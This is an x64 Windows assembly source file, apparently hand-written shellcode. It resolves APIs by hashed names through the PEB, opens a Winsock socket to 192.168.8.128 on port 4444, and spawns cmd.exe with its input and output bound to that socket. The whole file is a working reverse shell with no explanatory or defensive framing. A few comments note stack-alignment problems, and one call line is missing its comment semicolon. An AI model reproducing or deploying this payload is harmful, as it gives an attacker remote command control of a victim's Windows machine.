bits 64

_start:
    and rsp, -16
    mov r11d, 0xEC0E4E8E        ; LoadLibraryA
kernel32:
    mov rdx, [gs:0x60]      ; module peb
    mov rdx, [rdx+0x18]      ; module ldr field
    mov rdx, [rdx+0x20]      ; InMemoryOrderList first entry points to the primary module
    mov rdx, [rdx]          ; ntdll
    mov rdx, [rdx]          ; kernel32
    mov rdx, [rdx+0x20]     ; kernel32 base addrs
    xor r15, r15

    cmp r13b, 1              ; not so random check
    je setup_proc.cont

.resolve_export:
    mov eax, [rdx+0x3C]      ; e_lfanew
    add rax, rdx            ; ntsig

    mov ebx, [rax+0x88]      ; image data dir virtual address[0]
    add rbx, rdx            ; image export dir va

    mov ecx, [rbx+0x18]       ; no of names

    mov r8d, [rbx+0x20]      ; address of names rva
    add r8, rdx             ; array of address of names rvas
 
hash_loop:
    mov esi, [r8 + r15 * 4]     ; address of name rva
    add rsi, rdx    ;           name va
    xor eax, eax
    xor r9, r9      ; hash accumulator
.hash_func:
    lodsb   ; take 1 byte from rsi to al
    test al, al     ; check if end of string
    jz .hash_done   
    ror r9d, 0xd     ; rotate lower 32 bits by 13 bits
    add r9d, eax    ; add char to hash accumulator
    jmp .hash_func  ; loop
.hash_done:
    cmp r9d, r11d   ; check if its the right function hash
    je .found       ; if it is
    inc r15d        ; inc index
    loop hash_loop  ; dec number of names
.found:
    mov eax, [rbx+0x24]  ; address of ordinals rva
    add rax, rdx        ; address of ordinals va
    movzx rcx, word [rax + r15 * 2]     ; get function ordinal

    mov eax, [rbx+0x1C]      ; rva of function addresses
    add rax, rdx        ; va to array of function addresses
    mov eax, [rax + rcx * 4]    ; access function to find by index * 4 each function rva is a dword
    add rax, rdx        ; function
    cmp r11d, 0x3BFCEDCB    ; WSAStartup
    je wsastartup
    cmp r11d, 0xADF509D9    ; WSASocketA
    je wsasocketa
    cmp r11d, 0x4E121B69    ; inet_pton
    je inet_pton
    cmp r11d, 0xB32DBA0C    ; WSAConnect
    je wsaconnect
    cmp r11d, 0x16B3FE72    ; CreateProcessA
    je createprocessa
loadlib:
    lea rcx, [rel ws2_32]   ; access ws2_32 string
    sub rsp, 0x20   
    call rax    ; LoadLibraryA
    add rsp, 0x20  ; restore stack

    mov rdx, rax    ; rdx = ws2_32 dll base
    xor r15, r15
    mov r11d, 0x3BFCEDCB    ; WSAStartup
    jmp kernel32.resolve_export

wsastartup:
    push rdx    ; save base ---: misaligned
    sub rsp, 424    ; wsadata
    mov rcx, 0x202  ; version 2.2
    mov rdx, rsp    ; lpwsadata
    call rax    ; WSAStartup
    add rsp, 424    ; restore stack
    pop rdx     ; restore dll base

    xor r15, r15
    mov r11d, 0xADF509D9        ; WSASocketA
    jmp kernel32.resolve_export
wsasocketa:
    push rdx    ; misaligned 
    sub rsp, 56
    mov rcx, 2
    mov rdx, 1
    mov r8, 6
    xor r9, r9
    mov dword 0x20[rsp], 0
    mov dword 0x28[rsp], 0
    call rax    ;   WSASocketA
    mov rdi, rax
    add rsp, 56
    pop rdx    ; restore stack
    
    xor r15, r15
    mov r11d, 0x4E121B69        ; inet_pton
    jmp kernel32.resolve_export

inet_pton:
    push rdx
    sub rsp, 0x10
    mov word [rsp], 2
    mov word [rsp+2], 0x5C11    ; 4444 in big endian
    

    mov cl, 2
    lea rdx, [rel ip]
    lea r8, [rsp+4]
    call rax    ; inet_pton

    mov r14, rsp    ; sockin

    add rsp, 0x10
    pop rdx
    xor r15, r15
    mov r11d, 0xB32DBA0C        ; WSAConnect
    jmp kernel32.resolve_export

wsaconnect:
    sub rsp, 96
    mov rcx, rdi    
    mov rdx, r14    ; sockin
    mov r8b, 16
    xor r9, r9
    mov qword [rsp+32], 0
    mov qword [rsp+40], 0
    mov qword [rsp+48], 0
    call rax    ;    WSAConnect
    add rsp, 96

setup_proc:
    mov r13b, 1
    jmp kernel32    
.cont:
    xor r15, r15
    mov r11d, 0x16B3FE72    ; CreateProcessA
    jmp kernel32.resolve_export
createprocessa:
    mov r11, rdi
    sub rsp, 136    ; STARTUPINFOA + PROCESS_INFORMATION
    mov r10, rax
    xor rax, rax
    mov rdi, rsp
    cld
    mov rcx, 136
    rep stosb        ; ZERO OUT BOTH STRUCTS
    mov rax, r10
    mov rdi, r11
    mov dword [rsp], 112
    mov dword [rsp+60], 0x00000100
    mov qword [rsp+80], rdi
    mov qword [rsp+88], rdi
    mov qword [rsp+96], rdi
    mov r14, rsp 
    ; add rsp, 136

    sub rsp, 88
    xor rcx, rcx
    lea rdx, [rel cmd]
    xor r8, r8
    xor r9, r9
    mov byte [rsp+32], 1
    mov dword [rsp+40], 0
    mov qword [rsp+48], 0  
    mov qword [rsp+56], 0
    mov rbx, r14
    mov qword [rsp+64], rbx
    lea rbx, [r14+112]
    mov qword [rsp+72], rbx
    call rax    CreateProcessA
    add rsp, 88
    add rsp, 136    ;  Restore stack
done: 
    ret
ws2_32:
    db "ws2_32", 0
    ; ret
ip:
    db "192.168.8.128", 0
cmd:
    db "cmd", 0
